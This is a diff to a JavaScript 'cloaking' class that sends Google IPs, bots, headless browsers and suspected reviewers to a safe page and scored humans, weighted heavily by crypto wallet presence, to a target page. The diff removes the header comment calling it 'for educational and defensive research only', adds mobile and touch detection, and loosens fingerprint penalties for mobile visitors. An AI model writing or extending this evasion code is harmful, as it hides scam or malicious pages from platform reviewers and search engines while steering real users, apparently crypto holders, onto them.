@@ -1,25 +1,3 @@
-/**
- * Advanced Cloaking System v3.1 – Human‑First Edition
- * For educational and defensive research only.
- *
- * Features:
- * - Very high weights for wallet, battery, and behavioral signals
- * - Other signals contribute modestly to avoid false penalties
- * - Multi‑layer fingerprinting (canvas, WebGL, audio, fonts, plugins, etc.)
- * - IP reputation (public IP, datacenter/VPN detection via external API)
- * - Headless / automation detection
- * - Language/timezone consistency
- * - Reviewer pattern detection (optional safe fallback)
- *
- * Configuration:
- *   safePageUrl        – URL for bots/reviewers (default: '/safe')
- *   targetPageUrl      – URL for humans (default: '/target')
- *   strictnessLevel    – minimum human score (default: 55)
- *   debugMode          – print logs (default: false)
- *   usePublicIpService – use ipify.org (default: true)
- *   weights            – custom weight overrides (optional)
- */
-
 class AdvancedCloakingSystem {
     constructor(config = {}) {
         this.config = {
@@ -48,6 +26,7 @@ class AdvancedCloakingSystem {
             googleIp: -50,
             proxyVpn: -10,
             residentialIp: 5,
+            mobileBonus: 10,            // extra for mobile users
             ...config.weights
         };
 
@@ -62,6 +41,7 @@ class AdvancedCloakingSystem {
             startTime: Date.now(),
             maxScroll: 0,
             mouseMoves: 0,
+            touches: 0,
             clicks: 0,
             timeToFirstInteraction: null
         };
@@ -70,8 +50,17 @@ class AdvancedCloakingSystem {
         this.fingerprint = null;
         this.walletInfo = null;
         this.ipInfo = null;
+        this.isMobile = this.detectMobile();
 
-        this.log('Cloaking system initialized (human‑first mode)', 'info');
+        this.log('Cloaking system initialized (desktop + mobile mode)', 'info');
+        this.log(`Device detected as: ${this.isMobile ? 'MOBILE' : 'DESKTOP'}`, 'debug');
+    }
+
+    // ---------- Mobile detection ----------
+    detectMobile() {
+        const ua = navigator.userAgent;
+        const mobileRegex = /Android|webOS|iPhone|iPad|iPod|BlackBerry|IEMobile|Opera Mini/i;
+        return mobileRegex.test(ua) || ('ontouchstart' in window && window.innerWidth <= 1024);
     }
 
     // ---------- Bot signature database ----------
@@ -463,13 +452,14 @@ class AdvancedCloakingSystem {
         return results;
     }
 
-    // ---------- Behavioral tracking (more generous) ----------
+    // ---------- Behavioral tracking (counts touches) ----------
     startBehaviorTracking() {
         const onInteraction = (type) => {
             if (this.behavior.timeToFirstInteraction === null) {
                 this.behavior.timeToFirstInteraction = Date.now() - this.behavior.startTime;
             }
             if (type === 'click') this.behavior.clicks++;
+            if (type === 'touch') this.behavior.touches++;
         };
 
         window.addEventListener('scroll', () => {
@@ -502,6 +492,7 @@ class AdvancedCloakingSystem {
             timeOnPage,
             maxScroll: this.behavior.maxScroll,
             mouseMoves: this.behavior.mouseMoves,
+            touches: this.behavior.touches,
             clicks: this.behavior.clicks,
             timeToFirstInteraction: this.behavior.timeToFirstInteraction,
             timestamp: Date.now()
@@ -516,15 +507,20 @@ class AdvancedCloakingSystem {
     analyzeBehavior() {
         const session = JSON.parse(sessionStorage.getItem('visitor_behavior') || '{}');
         let score = 0;
-        if (session.timeOnPage > 3) score += 15;        // easier: 3 sec
-        if (session.maxScroll > 10) score += 15;        // any scroll helps
-        if (session.mouseMoves > 0) score += 15;        // even one mouse move
-        if (session.clicks > 0) score += 20;            // clicks are strong
-        if (session.timeToFirstInteraction && session.timeToFirstInteraction < 5000) score += 10; // 5 sec
+        if (session.timeOnPage > 3) score += 15;
+        if (session.maxScroll > 10) score += 15;
+        // For desktop, count mouse moves; for mobile, count touches
+        if (!this.isMobile) {
+            if (session.mouseMoves > 0) score += 15;
+        } else {
+            if (session.touches > 0) score += 15;  // mobile equivalent
+        }
+        if (session.clicks > 0) score += 20;
+        if (session.timeToFirstInteraction && session.timeToFirstInteraction < 5000) score += 10;
         return Math.min(this.weights.behavior, score);
     }
 
-    // ---------- Weighted scoring (with heavy weights on wallet, battery, behavior) ----------
+    // ---------- Weighted scoring (with mobile bonus) ----------
     calculateHumanScore(ipInfo, fingerprint, wallet, behaviorScore) {
         let score = 0;
         const w = this.weights;
@@ -546,6 +542,12 @@ class AdvancedCloakingSystem {
             }
         }
 
+        // ---- Mobile bonus ----
+        if (this.isMobile) {
+            score += w.mobileBonus;
+            weightsLog.push(`mobile_bonus:+${w.mobileBonus}`);
+        }
+
         // ---- IP signals (modest) ----
         if (ipInfo.isGoogle) {
             score += w.googleIp;
@@ -561,33 +563,42 @@ class AdvancedCloakingSystem {
             }
         }
 
-        // ---- Browser fingerprint (low impact) ----
+        // ---- Browser fingerprint (low impact, further reduced for mobile) ----
         if (fingerprint.plugins && fingerprint.plugins.length > 2) {
             score += w.plugins.many;
             weightsLog.push(`plugins>2:+${w.plugins.many}`);
         } else if (fingerprint.plugins && fingerprint.plugins.length === 0) {
-            score += w.plugins.none;
-            weightsLog.push(`no_plugins:${w.plugins.none}`);
+            // less penalty on mobile
+            let penalty = w.plugins.none;
+            if (this.isMobile) penalty = Math.min(0, penalty + 1); // make less negative
+            score += penalty;
+            weightsLog.push(`no_plugins:${penalty}`);
         }
 
         if (fingerprint.fonts && fingerprint.fonts.length > 10) {
             score += w.fonts.many;
             weightsLog.push(`fonts>10:+${w.fonts.many}`);
         } else if (fingerprint.fonts && fingerprint.fonts.length < 5) {
-            score += w.fonts.few;
-            weightsLog.push(`fonts<5:${w.fonts.few}`);
+            let penalty = w.fonts.few;
+            if (this.isMobile) penalty = Math.min(0, penalty + 1);
+            score += penalty;
+            weightsLog.push(`fonts<5:${penalty}`);
         }
 
         if (fingerprint.canvas && fingerprint.canvas.hash === 'canvas_error') {
-            score += w.canvasError;
-            weightsLog.push(`canvas_error:${w.canvasError}`);
+            let penalty = w.canvasError;
+            if (this.isMobile) penalty = Math.min(0, penalty + 2);
+            score += penalty;
+            weightsLog.push(`canvas_error:${penalty}`);
         }
 
         if (fingerprint.webgl && fingerprint.webgl.renderer) {
             const renderer = fingerprint.webgl.renderer.toLowerCase();
             if (renderer.includes('swiftshader') || renderer.includes('llvmpipe') || renderer.includes('mesa')) {
-                score += w.softwareRenderer;
-                weightsLog.push(`software_renderer:${w.softwareRenderer}`);
+                let penalty = w.softwareRenderer;
+                if (this.isMobile) penalty = Math.min(0, penalty + 3);
+                score += penalty;
+                weightsLog.push(`software_renderer:${penalty}`);
             }
         }
 
@@ -602,19 +613,21 @@ class AdvancedCloakingSystem {
             weightsLog.push(`mobile_res:+${w.mobileResolution}`);
         }
 
-        const isMobile = /Mobi|Android/i.test(navigator.userAgent);
-        if (fingerprint.screen.touchSupport === isMobile) {
+        const isMobileUA = /Mobi|Android/i.test(navigator.userAgent);
+        if (fingerprint.screen.touchSupport === isMobileUA) {
             score += w.touchConsistent;
             weightsLog.push(`touch_consistent:+${w.touchConsistent}`);
         }
 
         const langConsistency = this.checkLanguageConsistency();
         if (!langConsistency.consistent) {
-            score += w.langTzMismatch;
-            weightsLog.push(`lang/tz_mismatch:${w.langTzMismatch}`);
+            let penalty = w.langTzMismatch;
+            if (this.isMobile) penalty = Math.min(0, penalty + 2);
+            score += penalty;
+            weightsLog.push(`lang/tz_mismatch:${penalty}`);
         }
 
-        // ---- Behavioral score (heavy) ----
+        // ---- Behavioral score ----
         score += behaviorScore;
         weightsLog.push(`behavior:+${behaviorScore}`);
 
@@ -628,7 +641,6 @@ class AdvancedCloakingSystem {
     async determineVisitorType() {
         this.log('Starting classification', 'debug');
 
-        // ---- Immediate checks (hard fails) ----
         const ipCheck = await this.checkIPAddress();
         this.ipInfo = ipCheck;
         if (ipCheck.isGoogle) {
@@ -655,7 +667,6 @@ class AdvancedCloakingSystem {
             return { type: 'bot', reason: 'automation', showSafe: true };
         }
 
-        // ---- Soft signals ----
         const wallet = this.detectWallet();
         let behaviorScore = 0;
         if (this.hasExistingSession()) {
@@ -665,13 +676,11 @@ class AdvancedCloakingSystem {
             this.startBehaviorTracking();
         }
 
-        // ---- Reviewer detection (optional) ----
         if (this.isPotentialReviewer(fingerprint, ipCheck)) {
             this.log('Potential reviewer → safe', 'info');
             return { type: 'reviewer', reason: 'reviewer_pattern', showSafe: true };
         }
 
-        // ---- Weighted score ----
         const humanScore = this.calculateHumanScore(ipCheck, fingerprint, wallet, behaviorScore);
         this.log(`Human score: ${humanScore}% (threshold: ${this.config.strictnessLevel})`, 'info');
 
